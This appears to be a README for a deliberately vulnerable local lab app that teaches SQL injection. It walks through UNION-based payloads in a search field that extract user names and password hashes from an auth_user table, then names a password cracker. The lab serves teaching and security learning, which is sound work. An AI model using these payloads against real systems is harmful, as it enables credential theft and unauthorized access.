How to perform a SQL Injection Attack
add a test line just for learning reasons
### Build

docker build -t logstoneducation/sql-injection:0.0.1 .

### Run

docker run --rm -p 8000:8000 logstoneducation/sql-injection:0.0.1

### Exploit

1. http://127.0.0.1:8000/items/search
  1. Search for a few items (eg. Madison)
1. Check if the search is vulnerable by searching for `blah' UNION SELECT 1'`.
   This cause us to search for "blah" and then UNION that with a `SELECT 1`
   call.
1. It takes some trial and error before we find out the name of the user table:
1. Search for `z' UNION SELECT first_name FROM auth_user WHERE first_name LIKE '`
   1. `SELECT name FROM orders_item WHERE name LIKE '%z' UNION SELECT first_name FROM auth_user WHERE first_name LIKE '%'`
1. Instead of searching for `first_name`, we can search for `password`.
   1. `SELECT name FROM orders_item WHERE name LIKE '%z' UNION SELECT password FROM auth_user WHERE first_name LIKE '%'`

Now we can take these and pass them to a password cracker like [JTR](https://en.wikipedia.org/wiki/John_the_Ripper).
